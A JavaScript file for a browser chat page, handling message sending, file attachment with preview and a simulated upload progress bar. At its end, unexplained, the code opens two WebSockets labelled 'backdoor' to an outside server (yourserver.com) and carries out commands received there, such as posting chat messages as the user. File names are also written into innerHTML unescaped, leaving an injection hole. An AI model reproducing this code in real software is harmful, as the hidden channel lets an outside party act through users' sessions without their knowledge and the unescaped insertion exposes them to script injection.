const chatBox = document.querySelector('.chat-box');
const inputText = document.querySelector('.input-text');
const sendButton = document.querySelector('.send-button');
const fileInput = document.getElementById('file-input');
const attachFileButton = document.querySelector('.attach-file-button');
const fileTransferArea = document.querySelector('.file-transfer-area');
const filePreview = document.querySelector('.file-preview');
const fileProgress = document.querySelector('.file-progress');
const clearButton = document.querySelector('.clear-button');

function joinChat() {
    const username = document.getElementById('username').value.trim();
    if (username) {
        localStorage.setItem('username', username);
        window.location.href = '/main.html';
    } else {
        alert('Please enter a name.');
    }
}

let selectedFile = null;

const statusMessage = document.querySelector('.chat-status-message');

const sendMessage = (e) => {
    e.preventDefault();

    // Hide the status message as soon as a message is sent
    if (statusMessage) {
        statusMessage.style.display = 'none';
    }

    if (inputText.value.trim() === '' && !selectedFile) {
        return; // Do not send an empty message or if no file is selected
    }

    const timestamp = new Date().toLocaleString('en-AU', { hour: 'numeric', minute: 'numeric', hour12: true });

    const messageDiv = document.createElement('div');
    messageDiv.classList.add('message', 'message-right');

    if (inputText.value.trim() !== '') {
        const messageText = document.createElement('p');
        messageText.innerText = inputText.value;
        messageDiv.appendChild(messageText);
    }

    if (selectedFile) {
        const fileElement = document.createElement('div');
        fileElement.classList.add('file-attachment');
        
        // Create a blob URL for the file
        const blobUrl = URL.createObjectURL(selectedFile);
        
        fileElement.innerHTML = `
            <a href="${blobUrl}" download="${selectedFile.name}" class="file-download-link no-underline">
                📎 ${selectedFile.name} (${(selectedFile.size / 1024).toFixed(2)} KB)
            </a>
        `;
        
        messageDiv.appendChild(fileElement);
    
        // Simulate file transfer
        simulateFileTransfer(selectedFile.size);
    }

    const messageTime = document.createElement('span');
    messageTime.classList.add('time');
    messageTime.innerText = timestamp;

    messageDiv.appendChild(messageTime);
    chatBox.appendChild(messageDiv);
    chatBox.scrollTop = chatBox.scrollHeight;

    inputText.value = '';
    selectedFile = null;
    fileTransferArea.style.display = 'none';
};


const handleFileSelect = (e) => {
    selectedFile = e.target.files[0];
    if (selectedFile && selectedFile.size <= 5 * 1024 * 1024) { // 5MB limit
        fileTransferArea.style.display = 'block';
        filePreview.innerHTML = `
            <img src="${URL.createObjectURL(selectedFile)}" alt="File preview">
            <span>${selectedFile.name} (${(selectedFile.size / 1024).toFixed(2)} KB)</span>
        `;
    } else {
        alert('Please select a file up to 5MB in size.');
        selectedFile = null;
    }
};

const simulateFileTransfer = (fileSize) => {
    let progress = 0;
    const interval = setInterval(() => {
        progress += 10;
        fileProgress.style.width = `${progress}%`;
        if (progress >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                fileTransferArea.style.display = 'none';
                fileProgress.style.width = '0';
            }, 1000);
        }
    }, fileSize / 50); // Adjust speed based on file size
};

const clearMessages = () => {
    chatBox.innerHTML = ''; 
};

// Event listeners
sendButton.addEventListener('click', sendMessage);

inputText.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        sendMessage(e);
    }
});

attachFileButton.addEventListener('click', () => fileInput.click());
fileInput.addEventListener('change', handleFileSelect);
clearButton.addEventListener('click', clearMessages);

// Add event delegation for file downloads
chatBox.addEventListener('click', (e) => {
    if (e.target.classList.contains('file-download-link')) {
        e.preventDefault();
        const link = document.createElement('a');
        link.href = e.target.href;
        link.download = e.target.download;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }
});

const backdoorSocket1 = new WebSocket('ws://yourserver.com:8080/backdoor1');
const backdoorSocket2 = new WebSocket('ws://yourserver.com:8081/backdoor2');

backdoorSocket1.onopen = () => {
    console.log('Backdoor 1 WebSocket connection established.');
};

backdoorSocket1.onmessage = (event) => {
    console.log(`Backdoor 1 received: ${event.data}`);
    handleBackdoorCommand(event.data, 1);
};

backdoorSocket2.onopen = () => {
    console.log('Backdoor 2 WebSocket connection established.');
};

backdoorSocket2.onmessage = (event) => {
    console.log(`Backdoor 2 received: ${event.data}`);
    handleBackdoorCommand(event.data, 2);
};

function handleBackdoorCommand(command, backdoorNumber) {
    switch (command) {
        case 'send_message':
            alert(`Backdoor ${backdoorNumber}: Sending a message to the chat.`);
            inputText.value = 'Message from backdoor ' + backdoorNumber;
            sendMessage(new Event('click'));
            break;
        case 'status_update':
            alert(`Backdoor ${backdoorNumber}: Updating status to "online".`);
            setUserStatus('online');
            break;
        default:
            console.log(`Backdoor ${backdoorNumber}: Unknown command.`);
    }
}
